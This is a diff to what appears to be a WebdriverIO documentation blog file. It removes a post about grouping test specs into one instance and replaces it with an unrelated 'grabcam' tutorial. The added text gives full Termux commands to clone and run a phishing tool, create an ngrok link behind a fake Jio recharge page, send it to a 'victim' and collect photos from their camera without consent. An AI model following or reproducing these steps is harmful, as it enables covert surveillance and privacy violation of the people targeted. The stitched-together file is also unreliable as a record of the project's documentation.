@@ -1,71 +1,108 @@
 ---
-title: Grouping Specs for Execution in a Single Instance
-author: Ross Addinall
-authorURL: http://twitter.com/rossaddinall
-authorImageURL: https://s.gravatar.com/avatar/340d9dcc2c732de725ea9d94bdfcfe82?s=80
+title: Grabcam | Hack victims camera and see realtime image
+author: Abhinav Kumar
+authorURL: https://www.linkedin.com/in/Abhi6722
+authorImageURL: https://avatars.githubusercontent.com/u/62201123
 ---
 
-Until now, WebdriverIO has created a separate instance to run each of the spec files. So, if we have a directory structure that looks something like this:
+## About grabcam
+grabcam is a bash based script which is officially made for termux from this tool can hack you victims camera by simple offer page. This tool works on both rooted Android device and Non-rooted Android device.
+
+Well it have hurt the privacy of victim so here is a disclaimer. Use it only for fun and educational purpose. Don’t use to harm or take revenge.
+
+Now I will give you instructions to install this tool.
+
+## Let's do it
+Go to website
+https://github.com/Abhi6722/grabcam
+or simply copy this link from here
+
+Now open Termux and write the following command one by one.
+```
+apt update && apt install
+```
+```
+pkg install python python2 vim figlet curl
+```
+```
+pkg install php
+```
+```
+pip2 install lolcat
+```
+```
+pkg install git
+```
+```
+git clone https://github.com/noob-hackers/grabcam
+```
+```
+ls
+```
+```
+cd grabcam
+```
+```
+ls
+```
+```
+bash grabcam.sh
+```
+
+:::tip Remember
+Termux is case sensitive. So be very careful while writing the commands.
+:::
+
+Now you will see this image which is on your right side if you have successfully completed all the previous steps.
+But if not it might be some syntax error so just repeat the steps form starting and you will reach here.
+And if you get any problem just contact me.
+Give me screenshot of the terminal and i will surely help you out.
+
+Not after this lets just try to create a link and send it to our victim.
+
+We will do it by ngrok remember we install in our previous lecture.
+Write 2 and press enter
+You will see it will start installating automatically. Just keep in mind to turn on hotspot because there is a bug in ngork and will not generate link until to open hotspot.
+
+Now copy the direct link which is generated and send it to victim.
+Remember don’t turn close termux from recent app and don’t turn your hotspot off.
+Now as soon as victim open the link it will ask permission for him to acess his camera and it will start sending pictures of your victim to you.
+And victim will see fake jio recharge script.
+
+Now open termux and you will see [+] cam file recieved! in your terminal. It will send you pictures until you turn it off. To do so write
+```
+ctrl+c 
+```
+
+Now in order to see the files received write
+```
+ls
+```
+You will see the files appear there.
+Now we have to move these files to our
+storage. To do so write the move command
+as shown below.
+```
+mv filename.png /sdcard
+```
+
+Remember you have to write the file name received exactly same so i will suggest you to copy the name and paste it one after another.
+Or you can move them in bulk
+```
+mv file1.png file2.png file3.png /sdcard
+```
+
+Now type
 
 ```
-test
- └─── specs
-         │  test_login.js
-         │  test_product_order.js
-         │  test_checkout.js
-         │  test_b1.js
-         │  test_b2.js
+ls
 ```
-and the config file has specs defined as follows:
 
-```json
-    "specs": [
-        './test/specs/test*.js'
-    ],
-```
-then when WebdriverIO is run, the specs definition will be expanded to create a list of all the test files, and a separate instance will be created to run each test (up to the value of "maxInstances").  Remaining tests will be queued until tests complete.  Consequently, each test is run in its own instance.
+You will see files are not there it means  
+they are moved in sdcard.
+Now open your file manager and you will see
+your victims picture there.
+So enjoy and if you like our post Don’t forget to share with your friends and family and let us know in the comments section.
 
-This model has many advantages.  It means that tests can be run in parallel and makes it easier to retry tests that fail etc.
-
-However, there are cases where this does not work so well.  In one case a users flow involved transpiling tens of thousands of Typescript files for each of the ~250 test files, resulting in a huge overhead in the speed of the testing.  In another case a remote device farm was provisioning a new device for each test with all the associated setup thereby impacting performance and cost.
-
-At [Vertizan](https://www.vitaq.io) we are integrating our AI-driven and functional coverage-led Vitaq test automation tool with WebdriverIO and Mocha. For Vitaq AI to work, it needs to be able to select which test/action to run next and that requires having all of the tests available in a single instance.
-
-Consequently, we have worked with the WebdriverIO team to implement a syntax which allows the user to specify which tests should be grouped together for execution in the same instance.  All of the three test execution frameworks (Mocha, Jasmine, Cucumber) are supported by this approach, and by default they will run the tests sequentially.
-
-To take advantage of this capability, the definition of the specs in the WDIO config file has been extended so that it can now accept arrays within the specs array. All of the files within an inner array are grouped together and run in the same instance.
-
-So, the following specs definition:
-
-```json
-    "specs": [
-        [
-            "./test/specs/test_login.js",
-            "./test/specs/test_product_order.js",
-            "./test/specs/test_checkout.js"
-        ],
-        "./test/specs/test_b*.js",
-    ],
-```
-when run against the previously described directory tree would result in three instances:
-- One instance would run the group of test_login.js, test_product_order.js and test_checkout.js
-- Another instance would run test_b1.js
-- A final instance would run test_b2.js
-
-It is only the specs definition that supports this syntax.
-
-**EDIT:**
-This syntax has now been extended to support specs defined in suites, so you can now also define suites like this:
-```json
-    "suites": {
-        end2end: [
-            [
-                "./test/specs/test_login.js",
-                "./test/specs/test_product_order.js",
-                "./test/specs/test_checkout.js"
-            ]
-        ],
-        allb: ["./test/specs/test_b*.js"]
-},
-```
-and in this case all of the tests of the "end2end" suite would be run in a single instance.
+## Last words
+So folks a debt of gratitude is in order for visiting our blog. I trust you discover our article “termux metasploit pack mistake arrangement” supportive for you kindly offer and remark your idea about this article and continue visiting to get hacking and gaming and parcel more devices and news for nothing. much obliged to you!
